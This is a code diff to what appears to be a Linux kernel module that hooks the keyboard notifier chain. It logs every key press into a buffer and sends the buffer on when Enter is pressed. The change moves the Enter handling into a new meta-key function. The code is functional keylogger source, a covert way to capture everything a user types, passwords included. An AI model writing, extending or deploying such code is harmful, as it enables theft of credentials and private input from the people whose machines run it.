@@ -48,6 +48,11 @@ ssize_t tty_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
 ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
 int key_release( struct inode *inode, struct file *filp );
 
+/**
+* Return 1 if key was interpreted as a meta key, 0 otherwise
+*/
+static int interpret_meta_key( unsigned int keycode, unsigned int down );
+
 struct file_operations fops = {
     read:    key_read,
     write:   key_write,
@@ -238,19 +243,36 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL; 
 
-    if ( code == KBD_KEYCODE && param->down && registered_proc_count ) {
-        key_name = GET_KEYNAME( param->value );
-
-        if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
-            cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+    if ( code == KBD_KEYCODE ) {
+        // Process and skip key buffering for meta keys
+        if ( interpret_meta_key( param->value, param->down ) ) {
+            return NOTIFY_OK;
         }
 
-        if ( strcmp( "[Enter]", key_name ) == 0 ) {
-            SendKey();
+        if ( param->down && registered_proc_count ) {
+            
+            key_name = GET_KEYNAME( param->value );
+
+            if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
+                cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
+            }
         }
     }
 
     return NOTIFY_OK;
+}
+
+static int interpret_meta_key( unsigned int keycode, unsigned int down  ) {
+    switch ( keycode ) {
+    case 0x1C:
+        if ( down ) {
+            SendKey();
+        }
+        return 1;
+    // TODO: interpret more meta keys
+    }
+
+    return 0;
 }
 
 static struct notifier_block keyboardNotifierBlock = {
